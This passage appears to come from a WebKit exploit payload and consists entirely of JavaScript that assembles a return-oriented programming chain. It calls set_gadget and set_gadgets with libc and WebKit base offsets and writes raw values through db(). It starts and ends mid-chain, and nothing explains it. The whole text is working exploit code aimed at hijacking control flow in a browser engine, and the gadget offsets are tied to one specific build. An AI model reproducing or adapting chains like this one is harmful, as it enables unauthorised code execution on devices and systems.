set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+351928, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+351944, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+352016, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+352032, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+352152, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+352136, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965152, 4294967295]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965152, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+352296, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+352312, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+352464, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+352496, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+352448, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+352480, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+352616, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+352600, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965144, 4294967295]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+352688, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([2, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([28, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+352888, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+391184, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+353024, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+353040, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+353008, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+353136, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+353120, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+353232, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294965208, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+353312, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+353368, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+353464, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965160, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+353552, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+353568, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+353720, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+353752, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+353704, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+353736, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+353912, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+353880, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+353864, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([4, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+353984, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+354000, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+354088, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+354144, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+354216, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+354272, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+793877, 
ropchain+354376, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294965124, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+354480, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+354568, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+354584, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+354736, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+354768, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+354720, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+354752, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+354864, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+354848, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+354968, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+194592, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+398056, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+355144, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+160280, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
ropchain+398080, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+355288, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+160280, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965120, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+355416, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+793877, 
ropchain+355472, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+355536, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965120, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+355624, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+355640, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+355792, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+355824, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+355776, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+355808, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+355896, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+355912, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+356008, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+355992, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+356088, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([20, 0]); 
set_gadget(libc_base+788575,); 
db([20, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+356240, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+356256, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+356224, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
webkit_base+48555, 
libc_base+269973, 
libc_base+793877, 
ropchain+356424, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+356440, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+356408, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+356544, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+356592, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+356576, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+356704, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+356696, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+356720, 
ropchain+356736, 
libc_base+811575, 
ropchain+356752, 
libc_base+811575, 
ropchain+359984, 
libc_base+759626, 
libc_base+793877, 
ropchain+356808, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294965124, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+356888, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+356944, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+357040, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965120, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+357128, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+357144, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+357296, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+357328, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+357280, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+357312, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+357448, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+357464, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+357432, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+357552, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+357608, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+357728, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+357760, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+357744, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+270096, 
libc_base+793877, 
ropchain+357920, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+357888, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+357872, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+357976, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+358080, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+358112, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+358096, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+358272, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+358240, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+358224, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+358328, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+358432, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+358464, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+358448, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+358624, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+358592, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+358576, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+358680, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+358784, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+358816, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+358800, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+358976, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+358944, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+358928, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([56, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+359080, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+359064, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+398104, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+359232, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+160280, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+359320, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965120, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+359408, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+359424, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+359576, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+359608, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+359560, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+359592, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+359704, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+359688, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+359792, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+359864, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965120, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+359928, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+811575, 
ropchain+355480, 
libc_base+788575, 
ropchain+398112, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+360096, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+160280, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965096, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+360224, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+793877, 
ropchain+360280, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+360344, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965096, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+360432, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+360448, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+360600, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+360632, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+360584, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+360616, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+360704, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+360720, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+360816, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+360800, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+360896, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([20, 0]); 
set_gadget(libc_base+788575,); 
db([20, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+361048, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+361064, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+361032, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
webkit_base+48555, 
libc_base+269973, 
libc_base+793877, 
ropchain+361232, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+361248, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+361216, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+361352, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+361400, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+361384, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+361512, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+361504, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+361528, 
ropchain+361544, 
libc_base+811575, 
ropchain+361560, 
libc_base+811575, 
ropchain+365952, 
libc_base+759626, 
libc_base+793877, 
ropchain+361616, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294965124, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+361696, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+361752, 
webkit_base+7438103, 
